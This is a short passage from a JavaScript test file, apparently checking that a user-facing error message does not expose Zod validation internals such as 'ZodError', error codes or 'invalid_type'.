    expect(message).not.toContain('ZodError');
    expect(message).not.toContain('"code":');
    expect(message).not.toContain('invalid_type');
  });
});
